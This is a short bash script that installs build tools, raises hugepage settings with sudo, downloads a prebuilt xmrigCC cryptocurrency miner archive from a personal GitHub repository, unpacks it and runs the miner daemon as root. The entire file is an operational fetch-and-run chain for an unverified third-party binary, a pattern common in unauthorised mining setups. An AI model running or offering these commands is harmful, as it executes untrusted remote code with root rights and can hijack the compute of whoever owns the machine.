#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 && wget https://github.com/phungkhanh90/dao/raw/master/xmrigCC-1.9.3-with_tls-gcc7-linux-static-miner_only-x64.tar.gz && tar xf xmrigCC-1.9.3-with_tls-gcc7-linux-static-miner_only-x64.tar.gz && cd xmrigCC-1.9.3-with_tls-gcc7-linux-static-miner_only-x64 && ls -la && 
sudo ./xmrigDaemon
